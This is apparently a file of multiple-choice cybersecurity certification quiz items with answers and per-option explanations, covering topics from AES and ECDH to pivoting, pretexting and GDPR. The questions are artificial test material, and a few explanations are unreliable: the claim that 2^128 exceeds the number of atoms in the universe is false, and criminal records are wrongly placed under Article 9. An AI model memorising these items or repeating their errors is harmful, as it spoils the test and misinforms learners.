  {id:633,domain:A,question:"What is a unified threat management (UTM) device?",options:["A centralized security management console that coordinates activities across multiple geographically distributed security operations teams, providing unified ticketing, reporting, and escalation workflows","A single hardware appliance combining multiple security functions — firewall, IPS, VPN, antivirus, web filtering, email security — into one integrated platform","A centralized network management system for configuring and monitoring routers, switches, wireless access points, and other network infrastructure devices across a distributed enterprise environment","A centralized threat intelligence aggregation platform that receives, normalizes, and correlates threat indicator feeds from multiple commercial and open-source intelligence sources for analyst consumption"],answer:1,explanation:"UTM appliances (Fortinet FortiGate, SonicWall) simplify security for mid-size organizations — one vendor, one console, integrated updates — but create a single point of failure.",optionExplanations:["Centralized SOC management platforms are operational tools; UTM is a network security hardware appliance that integrates multiple security enforcement functions including firewall, IPS, VPN, and content filtering in one device.","A UTM combines multiple security functions in one box — reducing cost and complexity for organizations that can't staff multiple specialized security products.","Network management systems manage infrastructure devices; UTMs are integrated security appliances that enforce security policies — combining firewall, intrusion prevention, antivirus, and web filtering in one platform.","Threat intelligence platforms aggregate and distribute threat data; UTMs are network security enforcement appliances that use threat intelligence among their inputs to block threats across multiple security functions."]},
  {id:634,domain:P,question:"What is processing sensitive personal data under GDPR Article 9?",options:["Any operation performed on personal data belonging to citizens of EU member states, including collection, storage, transmission, analysis, and deletion, regardless of what type of personal data is involved","Processing special categories of personal data (health, biometric, racial/ethnic origin, religious beliefs, sexual orientation) subject to stricter conditions than ordinary personal data","The high-throughput ingestion and processing of petabyte-scale personal data repositories by large cloud platforms or analytics companies using distributed computing frameworks for business intelligence","Processing personal data belonging to government officials, elected politicians, senior corporate executives, or other high-profile public figures who require enhanced protection due to their public roles"],answer:1,explanation:"Article 9 special categories require explicit consent or other specific conditions (employment law, vital interests) — processing health data for marketing without explicit consent is a serious GDPR violation.",optionExplanations:["Processing any EU personal data is covered by general GDPR Article 6 provisions; Article 9 specifically governs special categories of sensitive data requiring additional legal basis and heightened protection measures.","GDPR Article 9 identifies nine special categories (health, biometric data for identification, genetics, racial/ethnic origin, political opinions, religious beliefs, trade union membership, sexual orientation, criminal records) requiring enhanced protection.","Data volume processing by large platforms is subject to GDPR generally; Article 9 applies based on the sensitivity category of the data type being processed, not the volume or throughput involved.","Data subject prominence does not determine Article 9 applicability; the special categories are defined by the nature of the data itself — health, biometric, genetic, racial origin, religious belief, sexual orientation."]},
  {id:635,domain:G,question:"What is AES (Advanced Encryption Standard)?",options:["A symmetric block cipher originally developed and classified by the NSA exclusively for protecting sensitive government communications, later declassified and made available to commercial entities under export restrictions","A symmetric block cipher adopted as the US federal standard in 2001, using 128-bit blocks and 128, 192, or 256-bit keys — the most widely deployed encryption algorithm today","A public-key cryptosystem based on elliptic curve discrete logarithm mathematics, designed to replace RSA for certificate signing operations by providing equivalent security with significantly smaller key sizes","A specialized cipher standard developed to secure communications infrastructure used exclusively by government agencies tracking and attributing advanced persistent threat groups to nation-state sponsors"],answer:1,explanation:"AES-256 is used in TLS, disk encryption (BitLocker, FileVault), VPNs, and secure communications — NIST selected it through an open public competition after DES became inadequate.",optionExplanations:["AES was publicly selected through NIST's open competition, not developed secretly by the NSA; Rijndael was submitted by Belgian cryptographers and selected in 2001 for unrestricted civilian and commercial use worldwide.","AES is a symmetric block cipher that encrypts 128-bit blocks using 10/12/14 rounds of substitution-permutation operations depending on key size — no practical attack exists against properly implemented AES.","ECDSA is an elliptic curve asymmetric algorithm for signatures; AES is a symmetric block cipher used for bulk data encryption, not as a replacement for asymmetric algorithms like RSA in PKI operations.","AES has no specific connection to APT attribution or government tracking operations; it is a general-purpose symmetric cipher used across virtually all encrypted communications, storage, and applications worldwide."]},
  {id:636,domain:T,question:"What is a kernel exploit?",options:["Malicious code targeting vulnerabilities in database management system internals such as query parsers or buffer handling routines, enabling unauthorized modification of data within the underlying storage engine","Code that exploits vulnerabilities in the operating system kernel to achieve privilege escalation from user-level to kernel-level (ring 0) access, providing complete system control","Malicious code targeting vulnerabilities in agricultural equipment automation software used to manage precision farming systems, potentially causing physical damage to crops or agricultural processing machinery","A zero-day exploit targeting vulnerabilities in the virtualization hypervisor layer that enables an attacker to escape a virtual machine container and gain control over the physical host and all co-resident VMs"],answer:1,explanation:"Kernel exploits (like EternalBlue exploiting MS17-010 in the Windows SMB kernel driver) provide ring 0 access — attackers can do anything: install rootkits, bypass all security controls.",optionExplanations:["Database engine exploits target DBMS software vulnerabilities; kernel exploits specifically target the operating system kernel to achieve ring 0 privilege escalation, gaining unrestricted hardware and system call access.","A kernel exploit achieves privilege escalation to the most privileged system level — kernel code runs with unrestricted hardware access, enabling rootkits, security control bypass, and complete system compromise.","Agricultural software exploits are an unrelated domain; kernel exploits target the operating system kernel layer — the most privileged execution ring — to achieve complete system compromise through privilege escalation.","VM escape or hypervisor exploits target the virtualization layer; kernel exploits target the OS kernel specifically to escalate from user-level to kernel-level access, achieving ring 0 privileges on a single system."]},
  {id:637,domain:A,question:"What is a network intrusion prevention system (NIPS) signature?",options:["A handwritten or digitally scanned authorization document that network administrators must obtain before making changes to firewall rulesets, routing configurations, or network access control lists","A pattern matching rule used by IPS sensors to identify known attack patterns in network traffic and automatically block or modify malicious packets","A software licensing agreement issued by a vendor granting an organization the legal right to deploy, operate, and maintain intrusion prevention system sensors within their network environment","A cryptographic hash or PKI certificate embedded within network frames that allows receiving systems to verify packets were transmitted by an authenticated and authorized source on the network"],answer:1,explanation:"NIPS signatures match packet content, protocol anomalies, or behavioral patterns against a database of known attacks — detecting and blocking SQL injection attempts, shellcode patterns, etc.",optionExplanations:["Change authorization documents are IT change management controls; IPS signatures are technical pattern-matching rules loaded into intrusion prevention sensors to identify and block known attack traffic patterns.","A NIPS signature defines the characteristics of a known attack — byte sequences, protocol flags, behavioral patterns — and the action to take (block, alert, reset connection) when matched.","Software licenses are commercial agreements with vendors; IPS signatures are detection content — specific pattern-matching rules defining attack characteristics and the automated response actions sensors should take.","Cryptographic packet authentication uses MACs or digital signatures; IPS signatures are pattern-matching rules at the sensor level that detect attack traffic characteristics and automatically block or alert on malicious packets."]},
  {id:638,domain:O,question:"What is a security maturity model?",options:["An organizational hierarchy chart mapping security analyst job titles, salary bands, promotion criteria, and career progression pathways from entry-level positions to senior security leadership roles","A framework measuring the sophistication and consistency of an organization's security practices across multiple dimensions, enabling benchmarking and improvement planning","A lifecycle management framework that tracks the procurement status, maintenance schedules, and planned decommissioning timelines for security hardware devices including firewalls, sensors, and endpoint agents","A rating system assigned by independent security testing laboratories to evaluate and compare the detection effectiveness, performance, and feature completeness of competing security product offerings"],answer:1,explanation:"CMMC, C2M2, and NIST CSF maturity levels (1-5) enable organizations to assess current capability and define a roadmap to higher maturity — with level 5 representing continuous improvement.",optionExplanations:["HR career ladders describe job progression; security maturity models assess organizational security program sophistication — measuring how consistently and systematically security practices are implemented across the enterprise.","Maturity models (like CMMI for security, C2M2) define maturity levels from initial/ad-hoc practices through defined processes to optimizing — enabling gap identification and improvement roadmaps.","Security hardware lifecycle tracking is asset management; security maturity models evaluate organizational capability and process consistency across people, process, and technology dimensions to guide improvement planning.","Lab testing ratings evaluate product capabilities; security maturity models assess organizational security program development — how consistently an organization defines, implements, and improves its security practices over time."]},
  {id:639,domain:T,question:"What is a watering hole attack's target selection strategy?",options:["Researching physical meeting locations such as industry conference venues, trade show floors, and professional association events where members of the target employee population regularly gather in person","Identifying websites that the specific target group frequently visits (industry portals, conference sites, supplier portals) and compromising those to passively await target visits","Scanning the internet using automated tools to identify any website containing exploitable vulnerabilities, without regard to which specific organizations or individuals are likely to visit those sites","Prioritizing websites for compromise by consulting public vulnerability databases and security research to identify which sites have the largest number of unpatched CVEs and weakest security configurations"],answer:1,explanation:"Nation-state APTs research targets' internet behavior (through OSINT, prior access) to identify their 'virtual watering holes' — security conference sites, defense contractor portals, industry news sites.",optionExplanations:["Physical gathering location research could support in-person social engineering; watering hole target selection identifies websites the target population frequently visits online so attackers can compromise those sites to passively await visits.","The strategic value of watering hole attacks comes from selecting sites that targets actually visit — making the compromise precisely targeted rather than opportunistic.","Opportunistic mass scanning targets vulnerable sites without regard to who visits them; watering holes deliberately choose sites based on the browsing patterns of a specific target group to enable highly focused compromise.","Selecting sites by vulnerability count focuses on ease of compromise; watering hole target selection is based entirely on which sites the specific target group visits — exploitability is secondary to relevance to the target."]},
  {id:640,domain:G,question:"What is the significance of key length in cryptography?",options:["Increasing key length always introduces significant computational overhead for encryption and decryption operations, making very long keys unsuitable for real-time applications despite the theoretical security improvement","Key length determines the size of the key space — longer keys exponentially increase the number of possible keys, making brute force attacks computationally infeasible","Key length affects only the throughput speed of encryption and decryption operations and has no mathematical bearing on resistance to brute force attacks or other cryptanalytic approaches","Any symmetric encryption key exceeding 128 bits provides mathematically equivalent security because modern hardware implementations fully eliminate performance differences and security margins between 128-bit and 256-bit modes"],answer:1,explanation:"AES-128 has 2^128 possible keys — more than the number of atoms in the observable universe — making brute force impossible with current and foreseeable technology.",optionExplanations:["Performance trade-offs exist but are secondary; key length's primary significance is the exponential expansion of key space it provides, making brute force enumeration computationally infeasible at sufficient lengths.","Each additional bit doubles the key space — AES-128 has 2^128 possible keys, AES-256 has 2^256 — making brute force attack time increase exponentially with key length.","Key length does not only affect speed; it fundamentally determines security by defining key space size — each additional bit doubles the number of possible keys, making brute force exponentially harder.","AES-128 and AES-256 both resist practical attacks today but differ in security margins against future attacks; the claim of equivalence ignores the exponential key space difference and long-term security considerations."]},
  {id:641,domain:T,question:"What is a security awareness phishing simulation?",options:["A tabletop exercise where security leadership and incident responders simulate responding to an active phishing campaign targeting executives, discussing response steps without using real infrastructure","Controlled phishing exercises conducted by organizations to test employee susceptibility to phishing attacks and measure the effectiveness of security awareness training","An automated technical evaluation of secure email gateway configurations, testing whether deployed filtering rules and sandbox analysis capabilities successfully detect and quarantine real phishing messages","A controlled laboratory experiment conducted by university researchers studying attack techniques, where participants act as simulated targets to evaluate phishing evasion methods under academic research protocols"],answer:1,explanation:"Phishing simulations measure click rates, credential submission rates, and reporting rates — showing training effectiveness and identifying employees who need additional coaching.",optionExplanations:["Tabletop exercises are discussion-based drills for response teams; phishing simulations involve sending realistic fake phishing emails to actual employees to measure susceptibility and training effectiveness.","Organizations use controlled phishing simulations (KnowBe4, Proofpoint) to send realistic fake phishing emails, measuring how many employees click, submit credentials, or report the email.","Email security tool testing evaluates technology effectiveness; phishing simulations test human behavior — measuring whether employees can identify phishing attempts and whether training improves their detection rates.","Academic phishing research evaluates attacker techniques in controlled settings; organizational phishing simulations are operational training programs measuring real employee susceptibility to improve security awareness."]},
  {id:642,domain:A,question:"What is a deception network (honeynet)?",options:["A commercial network infrastructure built and marketed using misleading capability claims, false performance benchmarks, and deceptive product specifications to mislead enterprise procurement and evaluation teams","A network of multiple interconnected honeypot systems designed to attract and monitor attackers, providing rich intelligence about attack methods and tools","An isolated lab network environment that replicates production system configurations specifically to test new security tools and validate detection signatures before deploying them to live production infrastructure","A software-defined networking management system that uses machine learning behavioral analysis to automatically detect anomalous traffic patterns and dynamically reconfigure network policies in enterprise environments"],answer:1,explanation:"Honeynets mimic entire network environments (corporate networks, industrial systems) — giving researchers and defenders detailed information about attacker TTPs, tools, and objectives.",optionExplanations:["Deceptive marketing is a business ethics violation; honeynets are legitimate security research and intelligence-gathering tools — deliberately designed decoy environments meant to attract and study real attackers.","A honeynet is a network of decoy systems that mirrors production environment characteristics — attracting attackers and monitoring their every action without risking real assets.","Security tool testing labs evaluate new defenses; honeynets are specifically designed to attract and monitor real attackers — they mimic production environments to lure adversaries, not to test security products.","AI-driven network anomaly detection is a real-time defense capability; honeynets are deliberately constructed decoy environments designed to attract attackers and provide intelligence about their tools and techniques."]},
  {id:643,domain:O,question:"What is a compliance audit?",options:["An audit of employee compliance with company dress code","A systematic examination to verify that an organization meets specific regulatory, contractual, or standards-based security requirements","A periodic examination of an organization's financial statements, accounting practices, and tax filings conducted by auditors to verify accuracy, regulatory compliance, and proper revenue recognition","An annual administrative review confirming that all security software products are properly licensed, that license counts match deployed instances, and that maintenance agreements are current"],answer:1,explanation:"PCI DSS QSA audits, SOC 2 audits, HIPAA audits, and FedRAMP assessments verify specific required controls are implemented and functioning — results may be publicly shared with clients.",optionExplanations:["Dress code compliance is HR; compliance audits verify technical and organizational security requirements.","Compliance audits assess whether organizations meet specific frameworks' requirements — PCI DSS for payment card data, HIPAA for health data, SOC 2 for SaaS security and availability promises.","Financial audits verify accounting accuracy and tax compliance; compliance audits in the security context verify that an organization meets specific cybersecurity regulatory or standards-based requirements.","Software license inventory checks are IT asset management activities; compliance audits verify whether an organization's security controls and practices meet specific regulatory or contractual requirements."]},
  {id:644,domain:P,question:"What is purpose specification in data collection?",options:["Assigning a descriptive classification label to each file stored in an organization's document management system, indicating its sensitivity level, content type, and required access control restrictions","Clearly identifying and documenting the specific, explicit, and legitimate purpose for which personal data will be collected before or at the time of collection","Defining the intended use cases and functional requirements for each database table during the schema design phase, documenting what data each field stores and how it will be processed","A requirements engineering document authored by software developers specifying the technical architecture, data flows, processing capacity requirements, and performance targets for a data processing system"],answer:1,explanation:"GDPR requires purposes to be stated before collection — 'collecting contact information for newsletter marketing and account notifications' is specific; 'for business purposes' is not.",optionExplanations:["File classification labeling is data governance; purpose specification is a GDPR privacy principle requiring organizations to clearly define and document the specific legitimate purpose for collecting personal data before collection begins.","Purpose specification requires organizations to articulate the precise reason for data collection before collecting it — enabling informed consent and preventing subsequent mission creep.","Database schema documentation is technical system design; purpose specification is the GDPR privacy principle requiring organizations to identify the explicit, legitimate reason for personal data collection before processing begins.","Technical architecture specifications describe system design; purpose specification is a privacy governance obligation to declare the specific legitimate purpose for which personal data is collected, limiting how that data may later be used."]},
  {id:645,domain:G,question:"What is elliptic-curve Diffie-Hellman (ECDH)?",options:["A variant of the classical Diffie-Hellman key exchange protocol that routes key negotiation packets through ellipse-shaped network topologies to minimize latency and optimize wide-area network performance","An asymmetric key exchange protocol using elliptic curve mathematics to establish a shared secret, providing equivalent security to classical DH with much smaller keys","An elliptic curve public-key algorithm that generates a mathematically linked signing key pair for creating and verifying digital signatures but cannot be used for key exchange or establishing shared secrets","A NIST-standardized function that derives symmetric encryption keys from an elliptic curve shared secret, using key derivation functions such as HKDF or PBKDF2 to produce keying material"],answer:1,explanation:"ECDH (specifically ECDHE for ephemeral/forward secrecy) is used in TLS 1.3 — providing key exchange with smaller key sizes than RSA/DHE, enabling faster handshakes on mobile and constrained devices.",optionExplanations:["Network topology shapes have no role in cryptographic protocols; ECDH uses elliptic curve algebraic structures — not network shapes — to enable two parties to establish a shared secret with smaller key sizes than classical DH.","ECDH uses the algebraic properties of elliptic curves to enable two parties to establish a shared secret over an insecure channel — like DH but more efficient with smaller keys.","ECDSA is the elliptic curve digital signature algorithm; ECDH is specifically for key agreement — establishing a shared secret between two parties using elliptic curve mathematics rather than producing signatures.","Key derivation functions process the shared secret output from ECDH; ECDH itself is the key agreement protocol — the mathematical process by which two parties independently compute the same shared secret using elliptic curves."]},
  {id:646,domain:T,question:"What is a pivot in penetration testing?",options:["Dynamically adjusting the penetration test methodology when initial attack approaches prove ineffective, switching from network-layer exploitation to application-layer or social engineering attack vectors","Using a compromised system as a launching point to reach other systems in different network segments that were not directly accessible from the attacker's initial position","Transitioning the penetration test approach from automated vulnerability scanning to manual exploitation and lateral movement once automated tools have exhausted their initial discovery phase results","A social engineering technique used during physical penetration tests where testers exploit tailgating opportunities or unlocked doors to move between different physically secured areas within a facility"],answer:1,explanation:"Pivoting enables reaching segmented networks — from internet-accessible web server, pivot to internal app server, pivot to database server, pivot to domain controller.",optionExplanations:["Methodology adjustment during engagements is tactical flexibility; pivoting is a specific network traversal technique using a compromised host as a relay to reach otherwise inaccessible systems in different network segments.","Network pivoting uses a compromised host as a relay — running port forwarding or SOCKS proxy through it to reach systems in adjacent network segments that firewalls prevent direct access to.","Shifting from automated to manual testing is a phased engagement methodology; pivoting specifically means using a compromised system as a network relay to reach targets in isolated segments not accessible from the initial position.","Physical access testing through tailgating is physical social engineering; network pivoting is a technical technique using a compromised host as a relay to traverse network segmentation and reach otherwise isolated internal systems."]},
  {id:647,domain:A,question:"What is network access control 802.1X?",options:["A Wi-Fi Protected Access security protocol that encrypts wireless traffic using AES-CCMP and authenticates users via pre-shared keys or enterprise RADIUS servers for wireless network protection","An IEEE standard providing port-based network access control, requiring devices to authenticate before being granted network access using EAP (Extensible Authentication Protocol)","An IEEE wireless networking standard defining the MAC and PHY layer protocols, authentication frame formats, and client association procedures used in 802.11 Wi-Fi network implementations","A high-speed Ethernet networking specification that defines the physical layer signaling and MAC layer protocols required for 10 Gigabit per second wired data transmission over copper and fiber cabling"],answer:1,explanation:"802.1X authenticates devices before granting network access — unathenticated devices are placed in a restricted VLAN, preventing unauthorized devices from accessing corporate networks.",optionExplanations:["WPA2/WPA3 are wireless encryption and authentication protocols; IEEE 802.1X is the underlying port-based access control standard used by enterprise wireless and wired networks requiring device authentication before granting access.","IEEE 802.1X provides port-level access control — the switch or AP sends an EAP challenge, the device authenticates (via certificate or RADIUS), and the port is opened or placed in a VLAN based on authentication result.","IEEE 802.11 defines wireless networking protocols; 802.1X is a separate authentication standard providing port-based network access control that can be applied to both 802.11 wireless and traditional wired Ethernet ports.","10GbE specifications define physical layer throughput standards; 802.1X is an authentication and access control standard that operates independently of link speed, governing port-level access for both wired and wireless networks."]},
  {id:648,domain:O,question:"What is evidence preservation in digital forensics?",options:["A biological sample preservation technique that applies chemical fixatives and stabilizing compounds to organic forensic evidence, preventing decomposition and maintaining sample integrity for laboratory analysis","Capturing and maintaining exact copies of digital evidence in a manner that prevents alteration, ensures integrity verification, and maintains admissibility in legal proceedings","Creating redundant backup copies of business-critical application data and system configurations to secondary storage locations as part of disaster recovery and business continuity planning","Documenting discovered security vulnerabilities and proof-of-concept exploit code in a structured vulnerability database, storing findings for later analysis without capturing live system state at discovery time"],answer:1,explanation:"Forensic images (dd, FTK Imager) create bit-for-bit copies; hash values (MD5, SHA-256) verify the copy is exact — any alteration changes the hash and is immediately detectable.",optionExplanations:["Chemical fixation preserves biological forensic samples; digital evidence preservation uses write blockers, cryptographic hash verification, and chain-of-custody documentation to maintain the integrity and admissibility of electronic evidence.","Evidence preservation maintains the integrity of digital evidence — using write blockers to prevent modification, creating verified copies, and documenting chain of custody to ensure admissibility.","Business continuity backups focus on data availability and recovery; forensic evidence preservation specifically maintains evidential integrity — preventing alteration, verifying bit-perfect copies, and documenting custody for legal admissibility.","Vulnerability documentation records security findings; digital forensic evidence preservation captures and maintains exact forensic copies of system state at the time of discovery in a legally admissible, integrity-verified form."]},
  {id:649,domain:T,question:"What is an application-layer DDoS attack?",options:["A network-layer denial-of-service attack that exploits memory corruption vulnerabilities in web application source code to crash the server process, causing complete service unavailability","An attack targeting web application resources — sending legitimate-looking HTTP requests that are computationally expensive to process, overwhelming servers with far less traffic than volumetric attacks","A distributed denial-of-service attack that is blocked by application-aware deep packet inspection firewalls before reaching target servers, based on signature matching of known attack traffic patterns","A denial-of-service attack that exploits implementation weaknesses in application-layer protocol features such as HTTP/2 multiplexing, SMTP pipelining, or DNS recursion to amplify request volume"],answer:1,explanation:"HTTP floods, Slowloris, and RUDY (R-U-Dead-Yet) target application resources rather than bandwidth — even low-rate attacks can overwhelm servers by triggering expensive database queries.",optionExplanations:["Memory corruption in application code is an application security vulnerability; Layer 7 DDoS sends high volumes of legitimate-looking HTTP requests that are expensive to process, overwhelming application resources without crashing via code bugs.","Layer 7 DDoS mimics legitimate web traffic, making filtering difficult — requests that trigger database queries, resource-intensive computations, or hold server connections are particularly effective.","DDoS mitigation filtering is a defense mechanism; a Layer 7 DDoS attack is defined by its attack vector — targeting application processing resources with computationally expensive legitimate-looking requests, not by whether it is filtered.","Protocol amplification exploits specific protocol behaviors; Layer 7 DDoS broadly targets application resource consumption through high volumes of computationally expensive requests, not necessarily through protocol-specific amplification mechanics."]},
  {id:650,domain:G,question:"What is a hybrid cryptosystem?",options:["A cryptographic implementation that simultaneously applies both a deprecated legacy cipher and its approved modern replacement to all data, maintaining interoperability with older systems while adopting stronger algorithms","A system that uses asymmetric cryptography to securely exchange a symmetric key, then uses the symmetric key for encrypting the actual data — combining the strengths of both approaches","A cryptographic architecture split between on-premises hardware security modules for key storage and cloud-based key management services for distribution, achieving redundancy across deployment environments","A security design pattern that selects different encryption algorithms based on data classification — applying computationally intensive ciphers to highly sensitive data and faster ciphers to lower-sensitivity content"],answer:1,explanation:"TLS, PGP, S/MIME all use hybrid cryptography — RSA or ECDH to exchange an AES key, then AES-GCM for bulk data — getting both the key management benefits of asymmetric and the speed of symmetric.",optionExplanations:["Running parallel deprecated and modern ciphers is a transition strategy; hybrid cryptosystems specifically combine asymmetric and symmetric cryptography — using asymmetric for key exchange and symmetric for bulk data encryption.","Hybrid cryptosystems exploit asymmetric crypto's key management advantage (no prior shared secret needed) with symmetric crypto's performance advantage — the asymmetric portion is small, the symmetric portion handles bulk data.","Hybrid cloud key management describes infrastructure deployment architecture; hybrid cryptosystems refer to the combination of asymmetric and symmetric algorithms — using asymmetric key exchange to establish a symmetric session key.","Algorithm selection by data classification is a data-centric security policy; hybrid cryptosystems specifically combine asymmetric key exchange with symmetric bulk encryption within a single communication session or data protection workflow."]},
  {id:651,domain:O,question:"What is the difference between vulnerability scanning tools and manual security testing?",options:["Automated vulnerability scanners provide exhaustive coverage by testing every conceivable attack vector and produce no false positives, making manual testing unnecessary for security-mature organizations","Automated scanners cover broad attack surface quickly but miss business logic flaws and context-dependent vulnerabilities; manual testing uses human expertise to find complex, chained vulnerabilities","Manual penetration testing by experienced security professionals produces definitive results with perfect accuracy, completely eliminating the need for automated scanning in organizations with adequate security budgets","Automated vulnerability scanners can discover every possible security flaw in a target system, while experienced manual testers are needed only to confirm which automated scanner findings are genuine issues"],answer:1,explanation:"Automated tools find the 'low-hanging fruit' efficiently; skilled pentesters find authentication bypass through business logic flaws, privilege escalation through parameter manipulation, and novel attack chains.",optionExplanations:["Scanners have broad but incomplete coverage with significant false positive rates; they miss business logic flaws and context-dependent vulnerabilities that require human judgment — manual testing is complementary, not redundant.","Scanners (Nessus, Qualys, Burp Suite scanner) efficiently find common vulnerabilities at scale; human testers bring creativity, business context, and the ability to chain vulnerabilities into realistic attack scenarios.","Manual testing provides human expertise but is time-consuming and cannot scale to cover entire attack surfaces; automated scanning covers broad surface area quickly — both approaches are complementary, not alternatives.","Automated scanners cannot find business logic vulnerabilities, context-dependent flaws, or novel chained attack paths — manual testers discover these complex vulnerabilities that automation cannot, not merely validate automated findings."]},
  {id:652,domain:T,question:"What is a multi-stage attack?",options:["A coordinated cyber campaign that requires simultaneous participation from multiple independent threat actor groups, each contributing specialized expertise to a jointly planned operation targeting a shared victim","An attack executed in sequential phases — initial access, establishing persistence, lateral movement, privilege escalation — each building on the success of the previous phase","A distributed denial-of-service campaign that spreads attack traffic across multiple geographically distinct target organizations simultaneously rather than concentrating all resources against a single victim","A persistent brute force authentication campaign that spreads credential attempts across multiple usernames and extended time windows to avoid triggering account lockout thresholds and detection systems"],answer:1,explanation:"APT attacks are inherently multi-stage — initial phishing provides access, persistence survives detection attempts, lateral movement reaches valuable assets, and privilege escalation enables exfiltration.",optionExplanations:["Multi-actor coordination describes APT group collaboration; multi-stage attacks describe sequential attack phases — initial access, persistence, lateral movement, privilege escalation — each building on the prior phase's success within a single operation.","Multi-stage attacks mirror real-world intrusions — each stage (initial access, persistence, discovery, lateral movement, collection, exfiltration) requires success before proceeding to the next.","Multi-target attacks describe broad attack campaigns; multi-stage attacks describe the sequential methodology within a single operation — where each successive phase builds on access and knowledge gained in the previous phase.","Slow credential stuffing describes a specific attack technique for evading lockout; multi-stage attacks describe complex intrusion operations with distinct sequential phases from initial access through final objective achievement."]},
  {id:653,domain:A,question:"What is security automation?",options:["Using AI-powered applicant tracking systems and automated resume screening tools to streamline recruitment, scheduling, and onboarding workflows for cybersecurity analyst and engineering positions","Using technology to perform security tasks automatically — log collection, alert triage, vulnerability scanning, threat detection, and response — reducing human effort and enabling scale","Networked IP surveillance camera systems with motion-triggered recording capabilities that automatically capture footage and generate security alerts when unauthorized movement is detected in monitored physical areas","Security software products that automatically download and install vendor-provided signature updates, threat intelligence feeds, and minor version patches without requiring manual administrator intervention"],answer:1,explanation:"Security automation (Python scripts, SOAR playbooks, CI/CD security gates) is essential at enterprise scale — humans cannot manually review millions of events or respond quickly enough to automated attacks.",optionExplanations:["HR recruitment automation uses technology for hiring efficiency; security automation specifically addresses performing security tasks automatically — log collection, alert triage, threat detection, incident response, and vulnerability management.","Security automation uses scripts, APIs, and SOAR platforms to automate repetitive tasks — log parsing, IoC lookup, ticket creation, device quarantine — freeing analysts for complex decisions.","Physical surveillance automation is a physical security function; security automation in cybersecurity refers to programmatic execution of digital security tasks — SOAR workflows, automated threat detection, and scripted incident response.","Automatic security tool updates are a software maintenance feature; security automation broadly encompasses automating security workflows — log analysis, alert correlation, threat hunting, and orchestrated incident response across the security stack."]},
  {id:654,domain:P,question:"What is a legitimate interest balancing test?",options:["A cost-benefit analysis evaluating whether the financial and operational expense of implementing specific privacy controls is proportionate to the data protection risk being addressed","A required assessment where organizations compare their legitimate interest in processing personal data against individuals' privacy rights and reasonable expectations — interests must outweigh privacy impact","A framework evaluation comparing an organization's data accuracy requirements against the privacy risks created by maintaining detailed personal data records, to determine appropriate minimization thresholds","A negotiation between data controllers and their appointed data processors to determine how processing responsibilities, compliance obligations, and liability exposure are allocated in data sharing agreements"],answer:1,explanation:"The balancing test considers: how serious is the privacy impact? Would individuals reasonably expect this processing? Can the purpose be achieved with less privacy impact? The balance must clearly favor the controller.",optionExplanations:["Cost-benefit analysis addresses control economics; the legitimate interests balancing test specifically weighs an organization's processing interests against individual privacy rights and reasonable expectations — not costs against benefits.","The balancing test is the third part of the LIA — after establishing a genuine interest and necessity, the organization must weigh that interest against the fundamental privacy rights and freedoms of data subjects.","Data quality versus privacy trade-offs are data governance considerations; the balancing test in LIAs compares the organization's legitimate processing interest against the fundamental privacy rights of the individuals whose data is processed.","Controller-processor responsibility allocation is addressed in data processing agreements; the legitimate interests balancing test is a unilateral assessment by the controller weighing its interests against individual privacy rights."]},
  {id:655,domain:G,question:"What is a session key?",options:["A temporary physical RFID access card programmed to grant visitor access to specific building areas during a single authorized visit, expiring automatically after the visit concludes","A temporary symmetric encryption key generated for a single communication session, used to encrypt traffic between parties, then discarded after the session ends","A long-lived symmetric encryption key maintained in server memory by a session management daemon and reused across multiple sequential client connections over an extended operational period","A long-lived cryptographic root key stored in a hardware security module from which all temporary session keys are derived through a standardized key derivation function for each session"],answer:1,explanation:"Session keys are ephemeral — TLS generates a new one for each connection using the negotiated key exchange, providing confidentiality for that session without reusing the long-term keys.",optionExplanations:["Temporary visitor access badges are physical security credentials; session keys are temporary symmetric cryptographic keys generated for a single network communication session and discarded once that session ends.","Session keys encrypt the actual data in a communication session — being temporary and session-specific, their compromise only affects that session, not past or future sessions (with PFS).","Persistent reused keys are master keys or long-term keys; session keys are temporary per-session keys generated fresh for each individual communication session and discarded afterward — not reused across sessions.","Long-term root keys in HSMs are master keys used to derive other keys; a session key is the temporary symmetric key derived from such a master key or key exchange, used only for the duration of a single communication session."]},
  {id:656,domain:T,question:"What is a pretexting phone call scenario?",options:["Calling a target from an untraceable prepaid mobile device purchased anonymously with cash to conduct social engineering reconnaissance without exposing the attacker's real phone number or identity","Calling a target while impersonating a trusted entity (IT support, bank, government) and using a fabricated scenario to extract sensitive information or convince them to perform an action","An automated robocall campaign playing pre-recorded audio messages impersonating banks or government agencies to trick recipients into disclosing account credentials via touch-tone keypad input","A role-playing exercise conducted during security awareness training where participants practice identifying social engineering attempts by acting out both attacker and victim roles in telephone conversations"],answer:1,explanation:"'Hi, this is Dave from IT Security. We've detected suspicious activity on your account. I need to verify your credentials to protect your account' — a classic IT support pretexting scenario.",optionExplanations:["Using an untraceable phone provides operational security for the caller; pretexting is the fabricated scenario and false identity used during the call — the deception technique itself, independent of what phone is used to make the call.","Pretexting phone calls combine a false identity with a believable scenario — creating urgency or authority to overcome the target's natural resistance to sharing sensitive information.","Automated vishing robocalls are a separate technique that doesn't allow dynamic conversation; pretexting requires live interaction so the attacker can adapt the fabricated scenario dynamically to overcome the target's specific questions and objections.","Security awareness roleplay is a defensive training exercise; pretexting is the actual social engineering attack technique where attackers use fabricated scenarios and impersonation to manipulate real targets into disclosing information."]},
  {id:657,domain:A,question:"What is a mobile device management (MDM) system?",options:["An enterprise billing and subscription management platform that tracks corporate mobile carrier contracts, monitors employee cellular data usage, and allocates monthly mobile service costs to departments","Software enabling organizations to remotely configure, monitor, secure, and manage mobile devices, enforcing policies and enabling remote wipe of corporate data","A centralized enterprise repository storing mobile application binary packages, version metadata, distribution policies, and installation approvals for apps deployed within an organization","A dedicated mobile application installed on IT administrators' smartphones to provide remote access to help desk ticketing systems, infrastructure monitoring dashboards, and service management consoles"],answer:1,explanation:"MDM (Intune, Jamf, MobileIron) enforces encryption, screen lock, certificate installation, app restrictions, and enables remote wipe — essential for BYOD and corporate mobile security.",optionExplanations:["Telecom expense management tracks carrier costs; MDM software enables organizations to remotely configure, secure, and manage mobile devices — enforcing security policies and enabling remote data wipe capabilities.","MDM solutions provide remote policy enforcement (requiring PIN, encryption, app restrictions), device inventory, security monitoring, and remote wipe capability for both corporate-owned and BYOD devices.","Mobile application repositories manage app distribution; MDM manages the devices themselves — enforcing configuration policies, monitoring compliance, encrypting data, and enabling remote management and wipe of corporate mobile devices.","Mobile IT management apps are administrative client tools; MDM is the server-side platform that remotely manages and enforces security policies on all enrolled employee mobile devices across the organization."]},
